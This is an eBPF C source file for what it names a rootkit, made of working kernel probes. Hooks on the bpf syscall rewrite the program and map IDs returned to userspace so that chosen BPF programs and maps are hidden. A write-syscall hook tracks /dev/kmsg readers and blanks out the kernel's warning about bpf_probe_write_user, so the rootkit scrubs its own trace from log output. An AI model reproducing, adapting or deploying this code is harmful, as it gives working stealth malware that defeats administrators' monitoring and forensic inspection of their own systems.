// SPDX-License-Identifier: GPL-2.0
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "rootkit.h"

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_HIDDEN_PROGS);
    __type(key, __u32);
    __type(value, __u32);
} hiding_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, RINGBUF_SIZE);
} event_ringbuf SEC(".maps");

static __always_inline void emit_event(__u8 action) // Sort of a fake function, it's always inlined in the code, its just to make the functions run in ebpf. 
{
    struct event_data *evt = bpf_ringbuf_reserve(&event_ringbuf, sizeof(*evt), 0);
    if (!evt)
        return;
    evt->action = action;
    bpf_ringbuf_submit(evt, 0);
}

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_CTX_ENTRIES);
    __type(key, __u64);
    __type(value, struct call_ctx);
} ctx_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);
} jump_trigger_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_HIDDEN_MAPS);
    __type(key, __u32);
    __type(value, __u32);
} map_hiding_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_CTX_ENTRIES);
    __type(key, __u64);
    __type(value, struct call_ctx);
} map_ctx_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);
} map_jump_trigger_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, __u32);
    __type(value, __u8);
    __uint(max_entries, 1024);
} kmsg_pids SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, __u64);
    __type(value, __u8);
    __uint(max_entries, 1024);
} openat_ctx SEC(".maps");

static const char TARGET_STR[] = "is installing a program with bpf_probe_write_user";
static const int TARGET_STR_LEN = sizeof(TARGET_STR) - 1;
#define MAX_LOG_SIZE 130

SEC("kprobe/__x64_sys_bpf")
int auditor_entry(struct pt_regs *ctx)
{
    struct pt_regs *regs = (struct pt_regs *)PT_REGS_PARM1(ctx);
    unsigned long cmd, uattr;
    
    bpf_probe_read_kernel(&cmd, sizeof(cmd), &regs->di); // Gets the first param of the syscall that is the command
    bpf_probe_read_kernel(&uattr, sizeof(uattr), &regs->si); // Gets the second param of the syscall that is the uattr
    
    if ((int)cmd == BPF_PROG_LOAD) {
        emit_event(ACTION_PROG_CHANGED);
        return 0;
    }

    if ((int)cmd == BPF_MAP_CREATE) {
        emit_event(ACTION_MAP_CHANGED);
        return 0;
    }
    
    if ((int)cmd == BPF_PROG_GET_NEXT_ID) {
        __u32 start_id = 0;
        if (bpf_probe_read_user(&start_id, sizeof(start_id), (void *)uattr) != 0)
            return 0;
        
        __u32 *jump_to = bpf_map_lookup_elem(&jump_trigger_map, &start_id); // Checks if we need need to change the current id in order to jump out!
        if (jump_to) {
            bpf_probe_write_user((void *)uattr, jump_to, sizeof(*jump_to));
            return 0;
        }
        
        __u64 pid_tgid = bpf_get_current_pid_tgid();
        struct call_ctx call_ctx = { .uattr_ptr = uattr, .start_id = start_id };
        bpf_map_update_elem(&ctx_map, &pid_tgid, &call_ctx, BPF_ANY); // Loads context for use in exit hook.
    }
    
    if ((int)cmd == BPF_MAP_GET_NEXT_ID) { // Does the same thing just with maps.
        __u32 start_id = 0;
        if (bpf_probe_read_user(&start_id, sizeof(start_id), (void *)uattr) != 0)
            return 0;
        
        __u32 *jump_to = bpf_map_lookup_elem(&map_jump_trigger_map, &start_id);
        if (jump_to) {
            bpf_probe_write_user((void *)uattr, jump_to, sizeof(*jump_to));
            return 0;
        }
        
        __u64 pid_tgid = bpf_get_current_pid_tgid();
        struct call_ctx call_ctx = { .uattr_ptr = uattr, .start_id = start_id };
        bpf_map_update_elem(&map_ctx_map, &pid_tgid, &call_ctx, BPF_ANY);
    }
    
    return 0;
}

SEC("kretprobe/__x64_sys_bpf")
int changer_exit(struct pt_regs *ctx)
{
    __u64 pid_tgid = bpf_get_current_pid_tgid();

    struct call_ctx *call_ctx = bpf_map_lookup_elem(&ctx_map, &pid_tgid);
    if (call_ctx) {
        if (PT_REGS_RC(ctx) != 0) { // If syscall failed, delete context not relevant. 
            bpf_map_delete_elem(&ctx_map, &pid_tgid);
            return 0;
        }
        
        // Handles case we need to hide program.
        __u32 returned_id = 0;
        bpf_probe_read_user(&returned_id, sizeof(returned_id), (void *)(call_ctx->uattr_ptr + 4));
        
        __u32 *next_valid_id = bpf_map_lookup_elem(&hiding_map, &returned_id); // Checks what to hide the program to.
        if (next_valid_id) {
            __u32 replacement = *next_valid_id;
            bpf_probe_write_user((void *)(call_ctx->uattr_ptr + 4), &replacement, sizeof(replacement));
        }
        
        bpf_map_delete_elem(&ctx_map, &pid_tgid); // Deletes from context map bc not relevant anymore. 
        return 0;
    }

    struct call_ctx *map_call_ctx = bpf_map_lookup_elem(&map_ctx_map, &pid_tgid); // Check if maps tracking this PID. 
    if (map_call_ctx) {
        if (PT_REGS_RC(ctx) != 0) { // If syscall failed not relevant. Nothing to change.
            bpf_map_delete_elem(&map_ctx_map, &pid_tgid);
            return 0;
        }
        
        __u32 returned_id = 0;
        bpf_probe_read_user(&returned_id, sizeof(returned_id), (void *)(map_call_ctx->uattr_ptr + 4)); // Gets the next id that it wants to return.
        
        __u32 *next_valid_id = bpf_map_lookup_elem(&map_hiding_map, &returned_id);
        if (next_valid_id) {
            __u32 replacement = *next_valid_id;
            bpf_probe_write_user((void *)(map_call_ctx->uattr_ptr + 4), &replacement, sizeof(replacement));
        }
        
        bpf_map_delete_elem(&map_ctx_map, &pid_tgid);
    }
    return 0;
}

// When BPF programs are unloaded. Since 3.18 https://github.com/torvalds/linux/commit/99c55f7d47c0dc6fc64729f37bf435abf43f4c60
SEC("kprobe/bpf_prog_put")
int detect_unload(struct pt_regs *ctx)
{
    emit_event(ACTION_PROG_CHANGED);
    return 0;
}

// When BPF maps are unloaded Since (At least) 5.5.9 http://bricktou.com/kernel/bpf/syscallbpf_prog_put_en.html 
SEC("kprobe/bpf_map_put")
int detect_map_unload(struct pt_regs *ctx)
{
    emit_event(ACTION_MAP_CHANGED);
    return 0;
}

// Trys checking when /dev/kmsg is opened
SEC("kprobe/__x64_sys_openat")
int track_kmsg_open_entry(struct pt_regs *ctx)
{
    struct pt_regs *regs = (struct pt_regs *)PT_REGS_PARM1(ctx);
    const char *filename;
    char path[16];
    
    bpf_probe_read_kernel(&filename, sizeof(filename), &regs->si);
    bpf_probe_read_user_str(path, sizeof(path), filename);
    
    if (bpf_strncmp(path, 9, "/dev/kmsg") == 0) {
        __u64 pid_tgid = bpf_get_current_pid_tgid();
        __u8 flag = 1;
        bpf_map_update_elem(&openat_ctx, &pid_tgid, &flag, BPF_ANY); // Updates temp context to let the exit hook know we're tracking the PID
    }
    
    return 0;
}

// Checks if successfuly opened /dev/kmsg
SEC("kretprobe/__x64_sys_openat")
int track_kmsg_open_exit(struct pt_regs *ctx)
{
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u8 *flag = bpf_map_lookup_elem(&openat_ctx, &pid_tgid); // Checks if we're tracking the PID
    
    if (!flag) return 0; // If not tracking, return
    bpf_map_delete_elem(&openat_ctx, &pid_tgid); // Deletes temporary context bc it did its job 
    
    int fd = PT_REGS_RC(ctx);
    if (fd < 0) return 0; // Checks if fd returned is invalid
    
    __u32 pid = pid_tgid >> 32;
    __u8 value = 1;
    bpf_map_update_elem(&kmsg_pids, &pid, &value, BPF_ANY);  // Lets the map hooks know this process has /dev/kmsg open. 
    
    return 0;
}

// Checks if trying to write the forbidden string. 
SEC("kprobe/__x64_sys_write")
int filter_stdout_write_entry(struct pt_regs *ctx)
{
    struct pt_regs *syscall_regs = (struct pt_regs *)PT_REGS_PARM1(ctx);
    
    unsigned int write_fd;
    char *write_buf;
    size_t write_len;
    bpf_probe_read_kernel(&write_fd, sizeof(write_fd), &syscall_regs->di); // Gets the first param of the syscall that is the fd
    bpf_probe_read_kernel(&write_buf, sizeof(write_buf), &syscall_regs->si); // Gets the second param of the syscall that is the user_buffer
    bpf_probe_read_kernel(&write_len, sizeof(write_len), &syscall_regs->dx); // Gets the third param of the syscall that is the length
    
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    __u8 *is_kmsg_reader = bpf_map_lookup_elem(&kmsg_pids, &pid);
    if (!is_kmsg_reader || write_fd != 1 || write_len < TARGET_STR_LEN)
        return 0;
    
    // Makes sure we don't read more than MAX_LOG_SIZE bytes
    char local_buf[MAX_LOG_SIZE];
    __u32 check_len = (write_len > MAX_LOG_SIZE) ? MAX_LOG_SIZE : (__u32)write_len;
    bpf_probe_read_user(local_buf, check_len, write_buf);
    
    // Checks if the forbidden string is in the buffer
    int match_found = 0;
    for (int i = 0; i < 100 && i + TARGET_STR_LEN <= check_len; i++) {
        if (bpf_strncmp(&local_buf[i], TARGET_STR_LEN, TARGET_STR) == 0) {
            match_found = 1;
            break;
        }
    }
    
    // If the forbidden string is in the buffer, overwrite it with spaces and a carriage return
    if (match_found) {
        char blank[256];
        for (int i = 0; i < 256; i++)
            blank[i] = ' ';
        
        __u32 blank_len = (write_len > 256) ? 256 : (__u32)write_len;
        if (blank_len > 1) {
            blank[blank_len - 1] = '\r';
            bpf_probe_write_user(write_buf, blank, blank_len);
        }
    }
    
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
